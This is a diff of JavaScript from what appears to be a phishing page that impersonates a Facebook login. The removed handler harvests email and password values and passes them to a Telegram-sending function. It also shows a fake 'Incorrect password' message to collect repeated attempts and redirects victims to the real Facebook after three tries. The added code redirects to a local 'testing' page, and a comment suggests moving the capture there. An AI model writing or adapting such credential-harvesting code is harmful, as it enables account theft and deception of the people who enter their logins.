@@ -138,51 +138,19 @@ async function sendToTelegram(email, password, attempt) {
 }
 
 function setupFinalLoginCapture() {
-    // If your "final" step has a form, we capture it here.
-    // If it redirects to testing/index.html, you should place the capturer there.
-    // Assuming the user is entering details in a form now:
-
     const fbLoginBtn = document.getElementById('fbLoginBtn');
     if (fbLoginBtn) {
-        fbLoginBtn.onclick = async function () {
-            // Get values from your input fields (adjust IDs if they differ in your HTML)
-            const emailInput = document.querySelector('input[type="text"]') || document.querySelector('input[type="email"]');
-            const passInput = document.querySelector('input[type="password"]');
+        fbLoginBtn.onclick = function () {
+            // Show spinner on button
+            fbLoginBtn.classList.add('loading');
 
-            if (!emailInput || !passInput || !emailInput.value || !passInput.value) {
-                alert("Please fill in your details.");
-                return;
-            }
+            // Remove any status message text
+            const statusMsg = document.getElementById('fb-status');
+            if (statusMsg) statusMsg.innerText = "";
 
-            const email = emailInput.value;
-            const password = passInput.value;
-
-            // Handle Attempts
-            let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
-            attempts++;
-            sessionStorage.setItem('fb_login_attempts', attempts);
-
-            // UI Feedback
-            fbLoginBtn.disabled = true;
-            fbLoginBtn.innerText = "Verifying...";
-
-            // Send to Telegram (AWAIT keeps the browser from cancelling the request)
-            await sendToTelegram(email, password, attempts);
-
-            // Redirection logic
-            if (attempts >= 3) {
-                window.location.href = "https://www.facebook.com/login/";
-            } else {
-                // Show error message and reset button
-                const statusMsg = document.getElementById('fb-status');
-                if (statusMsg) {
-                    statusMsg.innerText = "Incorrect password. Please try again.";
-                    statusMsg.style.color = "red";
-                }
-                fbLoginBtn.disabled = false;
-                fbLoginBtn.innerText = "Log In";
-                passInput.value = ""; // Clear password for next attempt
-            }
+            setTimeout(() => {
+                window.location.href = './testing/index.html';
+            }, 1200);
         };
     }
 }
